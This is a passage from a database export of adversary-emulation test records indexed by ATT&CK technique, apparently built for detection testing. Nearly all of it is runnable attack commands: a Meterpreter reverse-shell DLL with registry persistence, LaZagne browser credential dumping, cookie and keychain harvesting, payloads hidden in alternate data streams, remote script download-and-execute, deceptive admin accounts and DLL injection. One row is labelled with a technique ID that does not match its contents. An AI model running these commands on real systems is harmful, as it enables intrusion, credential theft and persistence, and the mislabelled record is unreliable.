"encoded_arguments_param_variation", "value": "EA"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{ads_file} -Force -ErrorAction Ignore\\n", "command": ["Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -Execute -ErrorAction Stop"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "ATHPowerShellCommandLineParameter -EncodedCommand parameter variations", "created_date": "29/07/2021", "post_command": [], "modified_date": "29/07/2021", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "command_line_switch_type", "value": "Hyphen"}, {"key": "encoded_command_param_variation", "value": "E"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{ads_file} -Force -ErrorAction Ignore\\n", "command": ["Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments", "created_date": "29/07/2021", "post_command": [], "modified_date": "29/07/2021", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "encoded_command_param_variation", "value": "E"}, {"key": "command_line_switch_type", "value": "Hyphen"}, {"key": "encoded_arguments_param_variation", "value": "EncodedArguments"}], "execution_status": "Pass"}]}}}}
232	\N		\N	yes		\N	2021-06-27 13:46:57.123754+00	T1547.010	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "reg delete\\\\\\\\\\\\\\"hklm\\\\\\\\\\\\\\\\system\\\\\\\\\\\\\\\\currentcontrolset\\\\\\\\\\\\\\\\control\\\\\\\\\\\\\\\\print\\\\\\\\\\\\\\\\monitors\\\\\\\\\\\\\\\\Pentestlab\\\\\\\\\\\\\\" /v \\\\\\\\\\\\\\"Driver\\\\\\\\\\\\\\" /d \\\\\\\\\\\\\\"test.dll\\\\\\\\\\\\\\" /t REG_SZ", "command": ["reg add \\\\\\\\\\\\\\"hklm\\\\\\\\\\\\\\\\system\\\\\\\\\\\\\\\\currentcontrolset\\\\\\\\\\\\\\\\control\\\\\\\\\\\\\\\\print\\\\\\\\\\\\\\\\monitors\\\\\\\\\\\\\\\\Pentestlab\\\\\\\\\\\\\\" /v \\\\\\\\\\\\\\"Driver\\\\\\\\\\\\\\" /d \\\\\\\\\\\\\\"test.dll\\\\\\\\\\\\\\" /t REG_SZ"], "executor": ["Cmd"], "platform": "Windows", "file_name": "T1547_010.bat", "pre_command": [], "ability_name": "", "created_date": "27/06/2021", "post_command": [], "modified_date": "", "pre-requisite": ["T1547_010.bat"], "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}], "metasploit": [{"cleanup": "reg delete \\"hklm\\\\system\\\\currentcontrolset\\\\control\\\\print\\\\monitors\\\\ignite\\" /v \\"Driver\\" /d \\"revershell.dll\\" /t REG_SZ", "command": ["use exploit/multi/handler", "set lhost 192.168.100.4", "set lport 8585", "set payload windows/x64/meterpreter/reverse_tcp", "run"], "executor": ["Meterpreter", "Msfconsole", "Cmd"], "platform": "Windows", "file_name": "handler.rb", "pre_command": ["msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.100.4 lport=8585 -f dll > revershell.dll"], "ability_name": "exploit/multi/handler", "created_date": "27/06/2021", "post_command": ["sessions 1", "reg setval -k HKLM\\\\\\\\software\\\\\\\\microsoft\\\\\\\\windows\\\\\\\\currentversion\\\\\\\\run\\\\\\\\ -v ignite -d 'C:\\\\Windows\\\\System32\\\\netsh'\\nshell", "reg add \\"hklm\\\\system\\\\currentcontrolset\\\\control\\\\print\\\\monitors\\\\ignite\\" /v \\"Driver\\" /d \\"revershell.dll\\" /t REG_SZ\\nwhoami"], "modified_date": "", "pre-requisite": ["revershell.dll"], "input_arguments": [{"key": "lhost", "value": "192.168.100.4"}, {"key": "lport", "value": "8585"}, {"key": "payload", "value": "windows/x64/meterpreter/reverse_tcp"}], "execution_status": "Pass"}]}}}}
315	\N		\N	yes	P2	\N	2021-07-30 02:52:53.878668+00	T1137.004	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "Remove-Item #{file_path}\\\\Sysinternals -Force -Recurse -ErrorAction Ignore", "command": ["cd ~/Library/Cookies\\ngrep -q \\"#{search_string}\\" \\"Cookies.binarycookies\\"\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Search macOS Safari Cookies", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "search_string", "value": "coinbase"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{file_path}\\\\Sysinternals -Force -Recurse -ErrorAction Ignore", "command": ["#{lazagne_path} browsers\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "LaZagne - Credentials from Browser", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{lazagne_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "lazagne_path", "value": "PathToAtomicsFolder\\\\T1555.003\\\\bin\\\\LaZagne.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["security -h\\nsecurity find-certificate -a -p > #{cert_export}\\nsecurity import #{cert_export} -k\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Keychain", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "cert_export", "value": "/tmp/certs.pem"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["Start-Process #{powershell_command}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Hidden Window", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "powershell_command", "value": "powershell.exe -WindowStyle hidden calc.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["type C:\\\\temp\\\\evil.exe > \\"C:\\\\Program Files (x86)\\\\TeamViewer\\\\TeamViewer12_Logfile.log:evil.exe\\"\\nextrac32 #{path}\\\\procexp.cab #{path}\\\\file.txt:procexp.exe\\nfindstr /V /L W3AllLov3DonaldTrump #{path}\\\\procexp.exe > #{path}\\\\file.txt:procexp.exe\\ncertutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\\\\temp:ttt\\nmakecab #{path}\\\\autoruns.exe #{path}\\\\cabtest.txt:autoruns.cab\\nprint /D:#{path}\\\\file.txt:autoruns.exe #{path}\\\\Autoruns.exe\\nreg export HKLM\\\\SOFTWARE\\\\Microsoft\\\\Evilreg #{path}\\\\file.txt:evilreg.reg\\nregedit /E #{path}\\\\file.txt:regfile.reg HKEY_CURRENT_USER\\\\MyCustomRegKey\\nexpand \\\\\\\\webdav\\\\folder\\\\file.bat #{path}\\\\file.txt:file.bat\\nesentutl.exe /y #{path}\\\\autoruns.exe /d #{path}\\\\file.txt:autoruns.exe /o \\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Alternate Data Streams (ADS)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "path", "value": "c:\\\\ADS\\\\"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item \\"#{ads_file_path}\\" -Force -ErrorAction Ignore\\n", "command": ["if (!(Test-Path C:\\\\Users\\\\Public\\\\Libraries\\\\yanki -PathType Container)) {\\n    New-Item -ItemType Directory -Force -Path C:\\\\Users\\\\Public\\\\Libraries\\\\yanki\\n    }\\nStart-Process -FilePath \\"$env:comspec\\" -ArgumentList \\"/c", "type", "#{payload_path}", ">", "`\\"#{ads_file_path}:#{ads_name}`\\"\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Store file in Alternate Data Stream (ADS)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "payload_path", "value": "c:\\\\windows\\\\system32\\\\cmd.exe"}, {"key": "ads_file_path", "value": "C:\\\\Users\\\\Public\\\\Libraries\\\\yanki\\\\desktop.ini"}, {"key": "ads_name", "value": "desktop.ini"}], "execution_status": "Pass"}, {"cleanup": "del #{file_name} >nul 2>&1\\n", "command": ["echo cmd /c echo \\"Shell code execution.\\"> #{file_name}:#{ads_filename}\\nfor /f \\"usebackq delims=?\\" %i in (#{file_name}:#{ads_filename}) do %i\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create ADS command prompt", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "file_name", "value": "%temp%\\\\T1564.004_has_ads_cmd.txt"}, {"key": "ads_filename", "value": "adstest.txt"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item -Path #{file_name} -ErrorAction Ignore\\n", "command": ["echo \\"test\\" > #{file_name} | set-content -path test.txt -stream #{ads_filename} -value \\"test\\"\\nset-content -path #{file_name} -stream #{ads_filename} -value \\"test2\\"\\nset-content -path . -stream #{ads_filename} -value \\"test3\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create ADS PowerShell", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{file_name}) { exit 0 } else { exit 1 }\\n"], "input_arguments": [{"key": "file_name", "value": "$env:TEMP\\\\T1564.004_has_ads_powershell.txt"}, {"key": "ads_filename", "value": "adstest.txt"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item \\"$env:TEMP\\\\extracted.exe\\" -ErrorAction Ignore\\n", "command": ["$macro = [System.IO.File]::ReadAllText(\\"PathToAtomicsFolder\\\\T1564\\\\src\\\\T1564-macrocode.txt\\")\\n$macro = $macro -replace \\"aREPLACEMEa\\"", " \\"PathToAtomicsFolder\\\\T1564\\\\bin\\\\extractme.bin\\"\\nIEX (iwr \\"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\\" -UseBasicParsing)\\nInvoke-Maldoc -macroCode \\"$macro\\" -officeProduct \\"Word\\" -sub \\"Extract\\" -NoWrap\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Extract binary files via VBA", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["try {\\n  New-Object -COMObject \\"Word.Application\\" | Out-Null\\n  Stop-Process -Name \\"winword\\"\\n  exit 0\\n} catch { exit 1 }\\n"], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "net user $ /DELETE 2>&1", "command": ["net user $ ATOMIC123! /add /active:yes"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create a user called \\"$\\" as noted here", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Remove-LocalUser -Name \\"Administrator \\" 2>&1 | out-null", "command": ["New-LocalUser -Name \\"Administrator \\" -NoPassword"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create an \\"Administrator \\" user (with a space on the end)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["mavinject.exe #{process_id} /INJECTRUNNING #{dll_payload}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "mavinject - Inject DLL into running process", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{dll_payload}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "process_id", "value": "1000"}, {"key": "dll_payload", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\x64\\\\T1218.dll"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["SyncAppvPublishingServer.exe \\"n; #{powershell_code}\\"\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "SyncAppvPublishingServer - Execute arbitrary PowerShell code", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "powershell_code", "value": "Start-Process calc.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["C:\\\\Windows\\\\SysWow64\\\\Register-CimProvider.exe -Path #{dll_payload}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Register-CimProvider - Execute evil dll", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{dll_payload}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "dll_payload", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\Win32\\\\T1218-2.dll"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["InfDefaultInstall.exe #{inf_to_execute}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InfDefaultInstall.exe .inf Execution", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "inf_to_execute", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\Infdefaultinstall.inf"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["FOR /F \\"tokens=2*\\" %a in ('reg query \\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\Winword.exe\\" /V PATH') do set microsoft_wordpath=%b\\ncall \\"%microsoft_wordpath%\\\\protocolhandler.exe\\" \\"ms-word:nft|u|#{remote_url}\\"\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "ProtocolHandler.exe Downloaded a Suspicious File", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"(Resolve-Path \\"C:\\\\Program Files*\\\\Microsoft Office\\\\root\\\\Office16\\")\\\\protocolhandler.exe\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "remote_url", "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["#{mwcpath}\\\\#{mwcname} \\"#{xml_payload}\\" output.txt\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Microsoft.Workflow.Compiler.exe Payload Execution", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{mwcpath}\\\\#{mwcname} ) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "xml_payload", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\T1218.xml"}, {"key": "mwcpath", "value": "C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319"}, {"key": "mwcname", "value": "microsoft.workflow.compiler.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["#{renamed_binary} #{xml_payload} output.txt\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Renamed Microsoft.Workflow.Compiler.exe Payload Executions", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["Copy-Item #{mwcpath}\\\\#{mwcname} \\"#{renamed_binary}\\" -Force\\nif (Test-Path \\"#{renamed_binary}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "xml_payload", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\T1218.xml"}, {"key": "renamed_binary", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\svchost.exe"}, {"key": "mwcpath", "value": "C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319"}, {"key": "mwcname", "value": "microsoft.workflow.compiler.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName #{module_name} -ModulePath #{module_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke-ATHRemoteFXvGPUDisablementCommand base test", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHRemoteFXvGPUDisablementCommand']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "module_name", "value": "foo"}, {"key": "module_path", "value": "$PWD"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["control.exe #{cpl_file_path}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Control Panel Items", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{cpl_file_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "cpl_file_path", "value": "PathToAtomicsFolder\\\\T1218.002\\\\bin\\\\calc.cpl"}], "execution_status": "Pass"}, {"cleanup": "$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$ExpectedOutput = 'Constructor_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nCheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "CheckIfInstallable method call", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}, {"key": "assembly_dir", "value": "$Env:TEMP\\\\"}, {"key": "invocation_method", "value": "CheckIfInstallable"}, {"key": "assembly_filename", "value": "T1218.004.dll"}], "execution_status": "Pass"}, {"cleanup": "$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\"/logfile= /logtoconsole=false `\\"$InstallerAssemblyFullPath`\\"\\"\\n$ExpectedOutput = 'Constructor_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nInstallHelper method execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InstallHelper method call", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}, {"key": "assembly_dir", "value": "$Env:TEMP\\\\"}, {"key": "invocation_method", "value": "InstallHelper"}, {"key": "assembly_filename", "value": "T1218.004.dll"}], "execution_status": "Pass"}, {"cleanup": "$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\"/logfile= /logtoconsole=false `\\"$InstallerAssemblyFullPath`\\"\\"\\n$ExpectedOutput = 'Constructor_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nInstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InstallUtil class constructor method call", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}, {"key": "assembly_dir", "value": "$Env:TEMP\\\\"}, {"key": "invocation_method", "value": "Executable"}, {"key": "assembly_filename", "value": "T1218.004.dll"}], "execution_status": "Pass"}, {"cleanup": "$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\"/logfile= /logtoconsole=false /installtype=notransaction /action=install `\\"$InstallerAssemblyFullPath`\\"\\"\\n$ExpectedOutput = 'Constructor_Install_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nInstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InstallUtil Install method call", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}, {"key": "assembly_dir", "value": "$Env:TEMP\\\\"}, {"key": "invocation_method", "value": "Executable"}, {"key": "assembly_filename", "value": "T1218.004.dll"}], "execution_status": "Pass"}, {"cleanup": "$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\"/logfile= /logtoconsole=false /U `\\"$InstallerAssemblyFullPath`\\"\\"\\n$ExpectedOutput = 'Constructor_Uninstall_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InstallUtil Uninstall method call - /U variant", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}, {"key": "assembly_dir", "value": "$Env:TEMP\\\\"}, {"key": "invocation_method", "value": "Executable"}, {"key": "assembly_filename", "value": "T1218.004.dll"}], "execution_status": "Pass"}, {"cleanup": "$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\"/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `\\"$InstallerAssemblyFullPath`\\"\\"\\n$ExpectedOutput = 'Constructor_Uninstall_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}, {"key": "assembly_dir", "value": "$Env:TEMP\\\\"}, {"key": "invocation_method", "value": "Executable"}, {"key": "assembly_filename", "value": "T1218.004.dll"}], "execution_status": "Pass"}, {"cleanup": "$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath 